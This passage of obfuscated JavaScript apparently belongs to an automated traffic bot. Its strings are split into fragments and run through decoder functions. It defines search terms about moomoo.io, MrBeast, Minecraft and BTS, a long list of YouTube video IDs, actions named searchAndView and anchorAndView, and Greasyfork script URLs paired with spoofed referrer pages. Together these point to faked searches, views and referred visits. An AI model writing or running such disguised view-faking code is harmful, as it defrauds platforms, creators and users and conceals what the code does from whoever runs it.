'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + V(0x4, 'qzg3') + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x13bf + 0xd1b * -0x1 + 0x5 * 0x694)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0xb14 + 0x25a6 + -0x2 * 0x1858)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + U(0xb) + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x1467 + -0x65a + 0x1ac4);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    U(0x15) + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    U(0x17) + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    U(0x1e) + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    U(0x6) + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    W(0x10) + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + V(0x0, '!8CO') + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + U(0xe) + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + V(0x14, '%lf)') + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
